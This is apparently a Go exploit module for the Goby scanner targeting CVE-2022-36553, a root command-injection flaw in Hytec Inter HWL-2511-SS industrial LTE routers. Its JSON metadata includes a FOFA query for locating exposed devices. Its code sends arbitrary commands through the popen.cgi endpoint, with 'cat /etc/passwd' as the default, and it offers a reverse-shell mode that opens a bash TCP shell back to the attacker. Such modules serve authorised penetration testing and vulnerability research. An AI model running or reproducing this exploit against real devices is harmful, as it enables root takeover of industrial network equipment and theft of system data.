package exploits

import (
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
	"time"
)

func init() {
	expJson := `{
    "Name": "HWL-2511-SS popen.cgi command execution vulnerability (CVE-2022-36553)",
    "Description": "<p>Hytec Inter HWL-2511-SS is an industrial LTE router and Wi-Fi access point from Hytec Inter, Japan.</p><p>Hytec Inter HWL-2511-SS v1.05 and earlier has a security vulnerability that stems from the CLI allowing attackers to execute arbitrary commands with root privileges.</p>",
    "Product": "Hytec Inter HWL-2511-SS",
    "Homepage": "https://hytec.co.jp/",
    "DisclosureDate": "2022-08-31",
    "Author": "abszse",
    "FofaQuery": "body=\"app/feature/portForwarding.js\" || body=\"app/app.translate-config.js\"",
    "GobyQuery": "body=\"app/feature/portForwarding.js\" || body=\"app/app.translate-config.js\"",
    "Level": "2",
    "Impact": "<p>Hytec Inter HWL-2511-SS v1.05 and earlier has a security vulnerability that stems from the CLI allowing attackers to execute arbitrary commands with root privileges.</p>",
    "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf\">https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf</a></p>",
    "References": [
        "https://gist.github.com/Nwqda/b27418ab801eb0b9cdbe8d042cb0249b"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "cat /etc/passwd",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "OR",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Command Execution"
    ],
    "VulType": [
        "Command Execution"
    ],
    "CVEIDs": [
        "CVE-2022-36553"
    ],
    "CNNVD": [
        "CNNVD-202208-4366"
    ],
    "CNVD": [],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "HWL-2511-SS popen.cgi 命令执行漏洞（CVE-2022-36553）",
            "Product": "Hytec Inter HWL-2511-SS",
            "Description": "<p>Hytec Inter HWL-2511-SS 是日本Hytec Inter公司的一种工业 LTE 路由器和 Wi-Fi 接入点。<br></p><p>Hytec Inter HWL-2511-SS v1.05 及之前存在安全漏洞，该漏洞源于 CLI 允许攻击者以 root 权限执行任意命令。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，补丁获取链接：<a href=\"https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf\">https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf</a><br></p>",
            "Impact": "<p>Hytec Inter HWL-2511-SS v1.05 及之前存在安全漏洞，该漏洞源于 CLI 允许攻击者以 root 权限执行任意命令。<br></p>",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "HWL-2511-SS popen.cgi command execution vulnerability (CVE-2022-36553)",
            "Product": "Hytec Inter HWL-2511-SS",
            "Description": "<p>Hytec Inter HWL-2511-SS is an industrial LTE router and Wi-Fi access point from Hytec Inter, Japan.<br></p><p>Hytec Inter HWL-2511-SS v1.05 and earlier has a security vulnerability that stems from the CLI allowing attackers to execute arbitrary commands with root privileges.<br></p>",
            "Recommendation": "<p>At present, the manufacturer has released an upgrade patch to fix the vulnerability. The link to obtain the patch: <a href=\"https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf\">https://hytec.co.jp/eng/wordpress/wp-content/uploads/2019/09/hwl-2511-ss-ds.3.0.pdf</a><br></p>",
            "Impact": "<p>Hytec Inter HWL-2511-SS v1.05 and earlier has a security vulnerability that stems from the CLI allowing attackers to execute arbitrary commands with root privileges.<br></p>",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PostTime": "2023-09-19",
    "PocId": "10839"
}`
	sendPayloadFlagbVdc := func(hostInfo *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		cmd = url.QueryEscape(cmd)
		payload := `/cgi-bin/popen.cgi?command=` + cmd + `&v=`
		getRequestConfig := httpclient.NewGetRequestConfig(payload)
		getRequestConfig.FollowRedirect = false
		getRequestConfig.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			rsp, _ := sendPayloadFlagbVdc(hostInfo, "echo "+checkStr)
			return rsp != nil && (strings.Contains(rsp.Utf8Html, checkStr) && !strings.Contains(rsp.Utf8Html, "echo")) || (strings.Contains(strings.ReplaceAll(rsp.Utf8Html, " ", ""), checkStr) && !strings.Contains(strings.ReplaceAll(rsp.Utf8Html, " ", ""), "echo"))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			// 默认为执行命令
			cmd := goutils.B2S(ss.Params["cmd"])
			waitSessionCh := make(chan string)
			if attackType != "cmd" && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
				return expResult
			}
			if attackType == "reverse" {
				// 读取端口
				rp, err := godclient.WaitSession("reverse_linux", waitSessionCh)
				if err != nil {
					expResult.Success = false
					expResult.Output = "无可用反弹端口"
					return expResult
				}
				cmd = `bash -c '` + godclient.ReverseTCPByBash(rp) + `'`
			}
			rsp, err := sendPayloadFlagbVdc(expResult.HostInfo, cmd)
			if err != nil && attackType != "reverse" {
				expResult.Success = false
				expResult.Output = err.Error()
				return expResult
			}
			if attackType == "cmd" {
				if rsp.StatusCode == 200 {
					expResult.Success = true
					expResult.Output = rsp.Utf8Html
				} else {
					expResult.Success = false
					expResult.Output = "命令执行失败"
				}
			} else if attackType == "reverse" {
				select {
				case webConsoleID := <-waitSessionCh:
					if u, err := url.Parse(webConsoleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output = `<br/><a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					}
				case <-time.After(time.Second * 20):
					expResult.Success = false
					expResult.Output = "漏洞利用失败"
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
